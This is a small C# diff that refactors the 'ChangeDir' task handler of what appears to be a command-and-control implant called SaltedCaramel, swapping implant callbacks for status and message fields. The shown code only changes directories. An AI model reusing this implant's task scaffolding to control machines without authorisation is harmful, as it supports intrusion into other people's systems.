@@ -6,19 +6,21 @@ namespace SaltedCaramel.Tasks
 {
     class ChangeDir
     {
-        internal static void Execute(SCTask task, SCImplant implant)
+        internal static void Execute(SCTaskObject task)
         {
             string path = task.@params;
 
             try
             {
                 Directory.SetCurrentDirectory(path);
-                implant.SendComplete(task.id);
+                task.status = "complete";
+                task.message = $"Changed to directory {task.@params}";
             }
             catch (Exception e)
             {
                 Debug.WriteLine($"[!] ChangeDir - ERROR: {e.Message}");
-                implant.SendError(task.id, $"ChangeDir: {e.Message}");
+                task.status = "error";
+                task.message = e.Message;
             }
         }
     }
